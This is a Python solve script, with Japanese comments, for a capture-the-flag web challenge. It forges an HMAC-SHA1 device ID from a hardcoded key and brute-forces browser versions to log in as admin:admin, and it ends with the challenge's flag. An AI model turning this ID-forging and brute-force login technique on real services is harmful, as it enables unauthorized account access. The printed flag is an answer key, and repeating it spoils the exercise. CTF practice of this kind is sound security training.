"""
ユーザーを識別するための`deviceId`がある。

```js:public/js/login.js
    const deviceId = CryptoJS.HmacSHA1(
      `${browserObject.name} ${version}`,
      "2846547907"
    );
```

ブルートフォースで、`admin:admin`の`deviceId`を特定する。

メモ： リダイレクト先を見るためには、`httpx`の`follow_redirects`オプションを忘れない 
"""

import httpx
import hmac
import hashlib
import re

BASE_URL = "http://toofaulty.chal.2024.ctf.acsc.asia"

def calc(browser, version):
    data = { "username": "admin", "password": "admin" }
    device_id = hmac.new(b"2846547907", f"{browser} {version}".encode(), hashlib.sha1).hexdigest()
    headers = {
        'X-Device-Id': device_id
    }

    print(f"Device ID: {device_id}")

    r = httpx.post(f"{BASE_URL}/login", headers=headers, data=data, follow_redirects=True)

    return "Your app role" in r.text, r.text

browser = "Chrome"
for v in range(100, 130):
    version = f"{v}.0"
    status, res_text = calc(browser, version)
    if status:
        print(f"Success: {browser} {version}")
        print(re.findall(r'ACSC{.+}', res_text)[0])
        break
    else:
        print(f"Fail: {browser} {version}")

# ACSC{T0o_F4ulty_T0_B3_4dm1n}
